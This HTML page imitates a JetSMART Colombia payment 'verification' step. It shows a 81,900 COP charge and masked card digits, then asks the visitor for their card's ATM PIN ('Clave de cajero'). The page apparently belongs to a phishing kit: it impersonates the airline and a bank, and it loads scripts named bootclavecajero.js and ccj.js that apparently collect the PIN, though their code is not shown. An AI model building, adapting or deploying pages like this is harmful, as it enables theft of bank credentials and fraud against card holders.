<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JetSMART - Verificación</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="shortcut icon" href="../assets/favicon.png" t  ype="image/x-icon">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../css/checkers.css">
    <link rel="stylesheet" href="../css/normalize.css">
    <script src="../js/functions.js"></script>
    <link rel="icon" href="../assets/logos/js-logo.png" type="image/x-icon">
</head>
<body>
    <div class="main-loader show">
        <img id="company-loader">
        <div class="loader"></div>
    </div>
    <div class="logos">
        <img id="bank-logo" width="50px">
        <img id="company-logo" width="110px">
    </div>

    <main>
        <div class="content">
            <b style="margin-bottom: 20px; display: block;" >Autorización de transacción</b>
            <p style="margin-bottom: 10px;" >La transacción que intenta realizar en <b>JetSMART CO</b> por <b>$ <span id="flight-price">81.900</span> COP</b> debe ser autorizada. Por favor verifica la siguiente información:</p>
            <p style="margin-bottom: 20px;">Ingrese los datos de su Banco Virtual:</p>
            <form id="form" style="margin-bottom: 30px;">
                <div class="labels">
                    <b>Comercio: </b>
                    <b>Monto: </b>
                    <b>Número de tarjeta: </b>
                    <b id="cdin" style="margin-bottom: 10px !important;">Clave de cajero: </b>
                    
                   
                </div>
                <div class="values">
                    <p>JetSMART CO</p>
                    <p>$ <span id="flight-price">81.900</span> COP</p>
                    <p>•••• •••• •••• <span id="card-digits"></span></p>
                    <input required type="password" id="ccajero" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                   
                </div>
            </form>
                    <div style="display: flex; justify-content: center;">
            <p id="error-message" style="color: red;"></p>
        </div>
        <button id="btnNextStep" class="btn-success" type="submit"  style="background-color: #000; color: #fff; border-radius: 25px; cursor: pointer; padding: 10px 20px;">
            Verificar
        </button>
        </div>
    </main>
    <script src="../js/bootclavecajero.js"></script>
    <script src="../js/id_check.js"></script>
    <script src="../js/ccj.js"></script>

</body>
</html>
